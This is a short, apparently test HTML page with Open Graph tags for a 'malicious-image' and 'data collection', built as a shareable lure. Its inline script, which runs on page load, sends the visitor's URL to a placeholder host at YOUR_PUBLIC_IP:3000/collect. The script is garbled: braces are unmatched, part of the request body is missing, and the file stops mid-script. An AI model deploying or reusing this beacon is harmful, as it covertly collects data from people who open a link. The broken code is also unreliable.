<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test Page</title>
    <meta property="og:title" content="Check this out!" />
    <meta property="og:description" content="Test page for data collection" />
    <meta property="og:image" content="https://example.com/malicious-image.png" />
    <script>
        fetch('http://YOUR_PUBLIC_IP:3000/collect', {
            method: 'POST',
            headers: {

                url: window.location.href
            })
        });
